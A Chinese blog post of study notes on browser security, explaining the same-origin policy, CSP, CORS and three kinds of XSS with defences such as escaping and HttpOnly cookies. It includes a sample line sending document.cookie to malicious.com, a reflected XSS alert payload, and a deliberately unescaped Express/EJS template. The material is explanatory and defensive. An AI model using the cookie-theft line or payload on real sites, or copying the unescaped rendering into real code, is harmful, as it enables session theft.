---
layout: post
title: 《浏览器工作原理与实践》系列笔记 - 浏览器安全
tags: [browser]
---

浏览器安全可以分为三个模块：Web 页面安全，浏览器网络安全和浏览器系统安全

假设我们没有安全策略，想想 web 世界会怎样？

web 世界会是开放的，任何资源都可以接入，我们网站可以加载并执行其他网站的脚本文件，图片，音视频，下载其他站点的可执行文件。这种绝对的自由，没有限制，会造成无序混乱和不可控的局面

比如打开银行站点，又打开一个恶意站点，恶意站点可以做很多事情

- 修改银行站点的 DOM，CSSDOM 信息
- 在银行站点插入 JavaScript 脚本
- 劫持用户登录的用户名和密码
- 读取银行站点的 cookie，indexDB 等数据
- 上传这些信息到自己的服务器
- 伪造转账请求等

我们需要有安全策略保障我们的隐私和数据，于是乎引出了最基础和核心的安全策略：同源策略（Same-origin policy）

# 同源策略：为什么 XMLHttpRequst 不能跨域请求资源

## 什么是同源策略

如果两个 URL 协议，域名，端口都一样，就认为他们是同源的

比如相同的 https 协议，同一个域名 www.qq.com ，以及都是 443 端口

两个同源之间可以相互访问资源和操作 DOM，不同源若想访问资源和操作 DOM，会有基础的安全策略制约，这就叫做同源策略

主要表现在 DOM，web 数据和网络三个层面

- DOM 层面，同源策略限制来自不同源的 JavaScript 脚本对当前 DOM 对象读和写的操作
- 数据层面，同源策略限制不同源的站点读取当前站点的 cookie，indexDB，localStorage 等数据
- 网络层面，同源策略限制了 XMLHttpRequst 等方式把站点的数据发送给不同源的站点

## 安全和便利性的权衡

我们了解同源策略隔离不同源的 DOM，数据和网络通信，实现 web 页面的安全性

安全性和便利性是互相对立的，不同源之间的绝对隔离是最安全的，但是也让 web 项目难以开发使用

所以需要做出权衡，满足灵活性，出让一定的安全性

但是这有引起了很多安全问题，比如 xss 攻击 和 csrf 攻击，这两个后续会详细说下

### 页面可以潜入第三方资源

同源要求所有资源来自同一个源，我们 html css javascript 图片 视频等文件都要部署在同一台服务器上，这违背了 web 的初衷，也有很多限制。比如很多的资源部署到了不同的 CDN 上，CDN 资源部署在另外一个域名上

于是乎同源策略对页面的引用资源开了个小口，可以任意引用外部文件

但是，比如我们现在首页被恶意程序劫持了，劫持手段很多，最常见的是恶意程序通过各种途径往 HTML 文件插入恶意脚本

比如我们在页面插入了一段脚本，HTML 送到浏览器的时候，浏览器无法知道是恶意的文件还是正常的，页面启动的时候可以去修改用户的搜索结果，改变内容指向

也可以把页面的敏感信息通过 xss 手段发送给服务器，比如点击了一个恶意链接，恶意的 JavaScript 代码读取数据发送给服务器。比如下面这段代码

```js
let url = `http://malicious.com?cookie = ${document.cookie}`;
open(url);
```

读取了 cookie，作为参数放到恶意站点尾部，服务器就能获取到用户的 cookie 信息了

为了解决 xss 引入了内容安全策略 CSP，核心思想是让服务器决定浏览器能够加载哪些资源，决定浏览器是否可以执行内联的 JavaScript 代码，大大减少了 xss 攻击

### 跨域资源共享和跨域文档消息机制

我们在官网 A 通过 XMLHttpRequest 请求 InfoQ 的资源，同源策略会限制我们发出请求，大大制约了生产力

我们引入了跨域资源共享（CORS），使用它进行跨域访问控制，让跨域数据传输更加安全进行

我们也说明了不同源无法互相操作 DOM，但是如果两个不同源 DOM 要通信的话，浏览器加入了跨文档消息机制，可以通过 window.postMessage 的 JavaScript 接口来和不同源的 DOM 进行通信

### 总结：

- 页面可以引入第三方资源，但是暴露了比如 XSS 的安全问题，在开放的基础上引入 CSP 限制自由程度
- XMLHttpRequest 无法进行跨域请求，在这严格策略基础上引入了跨站资源共享策略
- 不同源 DOM 无法互相操纵，引入跨文档消息机制

# 跨站脚本攻击 XSS：为什么 cookie 中有 httpOnly 属性

## 什么是 XSS 攻击

XSS 全称 Cross Site Scripting，跨站脚本攻击。指的是黑客往 HTML 文件或者 DOM 注入恶意脚本，用户浏览页面的时候利用注入的恶意脚本对用户进行攻击的手段

一开始是通过跨域来实现的，所以叫跨域脚本，但是现在 HTML 文件注入恶意代码的方法越来越多，跨域注入脚本不是唯一手段了。但是名字还是一直保留

页面注入脚本，浏览器无法区分是恶意还是正常的脚本，所以恶意脚本也有各种页面权限。我们看看恶意脚本能做什么

- 窃取 cookie，通过 document.cookie 获取 cookie 信息，通过 XMLHttpRequest 或者 Fetch 加上 CORS 功能把数据发送给恶意服务器，恶意服务器拿到 cookie 信息可以在电脑上模拟登录，进行恶意操作
- 监听用户行为，比如使用 addEventListener 接口监听键盘事件，获取用户输入的信用卡信息，发到恶意浏览器，黑客又可以做很多事情了
- 修改 DOM 伪造登陆窗口，欺骗用户输入用户名和密码
- 生成浮窗广告，严重影响用户体验

注入了恶意脚本相当于页面的隐私数据完全暴露给黑客了

## 恶意脚本是怎么注入的

通常有 存储型 XSS 攻击，反射型 XSS 攻击，基于 DOM 的 XSS 攻击

### 存储型 XSS 攻击

![](/img/posts/browser/macro/1.png)

- 黑客利用漏洞提交恶意代码到网站数据库
- 用户请求包含恶意代码的脚本页面
- 用户浏览页面的时候把 cookie 信息上传到服务器

比如喜马拉雅 2015 年专辑名字没有过滤，用户打开设置了恶意代码的专辑的时候，就会执行恶意代码了，把 cookie 上川岛黑客的服务器中，然后可以模拟登录以后做恶意操作

### 反射型 XSS 攻击

恶意脚本属于用户发送给网站请求的一部分，随后网站又把恶意脚本返回给用户，当恶意脚本在用户页面执行，又可以执行一些恶意操作

比如我们下面这行服务器代码：

```js
var express = require('express');
var router = express.Router();
/* GET home page. */
router.get('/', function (req, res, next) {
  res.render('index', { title: 'Express', xss: req.query.xss });
});

module.exports = router;
```

而视图代码如下：

```html
<!DOCTYPE html>
<html>
  <head>
    <title><%= title %></title>
    <link rel="stylesheet" href="/stylesheets/style.css" />
  </head>
  <body>
    <h1><%= title %></h1>
    <p>Welcome to <%= title %></p>
    <div><%- xss %></div>
  </body>
</html>
```

把 url 中 xss 参数显示在页面中，如果打开的是正常的 `http://localhost:3000/?xss=123` 连接，页面直接显示 123

但是如果打开的是 `http://localhost:3000/?xss=<script>alert('你被xss攻击了')</script>`

就会弹出来一个 你被 xss 攻击了 的提示了

用户把一些恶意的代码请交给服务器，服务器收到请求又把恶意代码反射给了浏览器，这就是 反射型 XSS 攻击

现实中黑客通过 QQ 群或者邮箱等渠道诱导用户去点击恶意链接

服务器是没有去存储这些反射型 XSS 攻击的恶意脚本的，这就是和 存储型 XSS 攻击不同的地方

### 基于 DOM 的 XSS 攻击

不涉及 Web 服务器，用户通过各种手段把恶意脚本注入到用户页面，比如网络劫持页面传输过程中的 HTML 页面内容（通过 Wi-Fi 路由器劫持，恶意软件劫持等等），共同点是资源在传输过程或者用户使用页面的时候修改 web 页面的数据

## 如何组织 XSS 攻击

存储型 XSS 和反射型 XSS 都需要经过服务器的处理，这两种可以认为是服务端的安全漏洞。

基于 DOM 的 XSS 攻击都是在浏览器端完成的，可以认为是前端的安全漏洞

但是它们都有一个共同点，需要往浏览器注入恶意脚本，通过恶意脚本运行去进行恶意操作，发送用户信息到恶意服务器

所以要怎么阻止 XSS 攻击，通过阻止恶意脚本注入和恶意消息的发送来实现

### 服务器对输入脚本进行过滤转码

不管反射型还是存储型，都可以在服务器对关键的字符转码和过滤，比如 `code:<script>alert('你被 xss 攻击了')</script> ` 过滤后只剩下了 code。前端请求到的页面，脚本内容都被过滤了，前端也就不会执行了

也可以对内容进行转码，把上面的代码转码成 `code:&lt;script&gt;alert(&#39; 你被 xss 攻击了 &#39;)&lt;/script&gt;`，前端也无法执行这段代码

### 充分利用 CSP

严格实施 CSP 可以有效防范 XSS 攻击

- 限制还在其他域下的资源文件，比如黑客插入的不同域名脚本文件，是无法被加载的
- 禁止向第三方提交数据，用户数据也不会外露了
- 禁止内联脚本和未授权的脚本
- 提供了上报机制，尽快发现有哪些 XSS 攻击，进行修复

### 使用 HttpOnly 属性

很多 XSS 攻击是盗用 cookie 的，可以用 HttpOnly 属性保护我们 cookie 的安全，它是通过服务器响应头设置的，比如：

`set-cookie: sid=123456; expires=Sat, 18-Apr-2020 06:52:22 GMT; path=/; domain=.google.com; HttpOnly`

最后使用了 HttpOnly，这个 cookie 无法通过 document.cookie 获取，重要的数据都可以这样设置一下

## 总结

XSS 攻击就是黑客往页面注入恶意脚本，把重要数据上传到恶意的服务器，常见的三种是 存储型 XSS，反射型 XSS 和基于 DOM 的 XSS 攻击

他们都需要往页面注入恶意脚本，通过恶意脚本把用户数据上传到黑客的服务器

他们注入方式也不同，又通过服务器漏洞的，也有客户端直接注入的

针对这些攻击，三种主要的手段是服务器对输入的内容进行过滤或者转码，第二是利用好 CSP，第三是使用 HttpOnly 保护重要的 cookie 信息

我们也可以加入验证码防止冒充用户提交数据，一些不受信任的输入限制长度，也加大了 XSS 攻击的难度
